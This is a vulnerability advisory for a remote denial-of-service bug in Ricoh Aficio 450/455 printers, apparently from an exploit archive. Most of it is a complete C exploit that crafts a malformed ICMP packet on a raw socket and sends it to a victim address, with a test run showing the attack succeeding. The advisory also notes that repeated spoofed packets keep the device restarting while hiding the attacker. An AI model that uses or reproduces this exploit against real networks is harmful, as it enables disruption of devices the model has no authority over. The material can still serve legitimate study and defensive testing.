// source: https://www.securityfocus.com/bid/11932/info

It is reported that Ricoh 450/455 printers are susceptible to a remote denial of service vulnerability. This issue is due to a failure of the device to properly handle exceptional ICMP packets.

Remote attackers may exploit this vulnerability to restart affected devices. Repeated packets may be utilized to sustain the condition, causing the device to repeatedly restart. Source addresses of the malicious ICMP packets may also be spoofed, reducing the likelihood of locating, or blocking access to the attacker.

Due to code reuse among devices, it is likely that other printers are also affected.

/*
 * RICOH Aficio 450/455 PCL 5e Printer ICMP DOS vulnerability Exploit.
 * DATE: 12.15.2004
 * Vuln Advisory : Hongzhen Zhou<felix__zhou _at_ hotmail _dot_ com>
 * Exploit Writer : x90c(Kyong Joo)@www.chollian.net/~jyj9782
 *
 * Testing -----------------------------------------------
 * root@testbed:~/raw# gcc -o rpcl_icmpdos rpcl_icmpdos.c
 * root@testbed:~/raw# ./rpcl_icmpdos
 * Usage: ./rpcl_icmpdos <victim>
 * root@testbed:~/raw# ./rpcl_icmpdos 192.168.2.4
 * exploit sent ok() = ..x-_-x..
 * root@testbed:~/raw#
 *
 */

#include<sys/types.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<linux/ip.h>
#include<linux/icmp.h>

unsigned short cksum(unsigned short *buf, int len);

struct icmp_packet{
        struct icmphdr icmp;
        struct iphdr inip;
        unsigned char bigger[90];               // STEP1: Bigger Data(ICMP Header(8)+ inip(20) + 90(bigger data))
} packet;


/* ########################
 * #     Entry Point      #
 * ########################
*/

int main(int argc, char *argv[]){
struct sockaddr_in ca;
int sockfd, ret;

if(argc<2){
        printf("Usage: %s <victim>\n", argv[0]);
        exit(-1);
}

sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

memset(&packet, 0, sizeof(packet));

packet.icmp.type = 3;                           // STEP2: Destination Unreachable.
packet.icmp.code = 1;
packet.icmp.un.echo.id = getpid();
packet.icmp.un.echo.sequence = 0;

packet.inip.ihl = 5;
packet.inip.version = 4;
packet.inip.tot_len = htons(20);
packet.inip.id = htons(9090);
packet.inip.ttl = 90;
packet.inip.protocol = IPPROTO_TCP;             // STEP3: IPPROTO_UDP also useable.
packet.inip.saddr = inet_addr("127.0.0.1");
packet.inip.daddr = inet_addr("127.0.0.1");
packet.inip.check = (unsigned short) cksum((unsigned short *)&packet.inip, 20);

packet.icmp.checksum = cksum((void *)&packet, sizeof(packet));

memset(&ca, 0, sizeof(ca));
ca.sin_family = AF_INET;
ca.sin_addr.s_addr = inet_addr(argv[1]);


if((sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&ca, sizeof(ca))) == sizeof(packet))
        printf("exploit sent ok() = ..x-_-x..\n");
else
        printf("exploit sent failed() = ..o^O^o..\n");


close(sockfd);

}


/* ########################
 * #  Internet Checksum   #
 * ########################
*/

unsigned short cksum(unsigned short *buf, int len){
register unsigned long sum;

for(sum = 0; len > 0; len--) sum += *buf++;
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
return ~sum;
}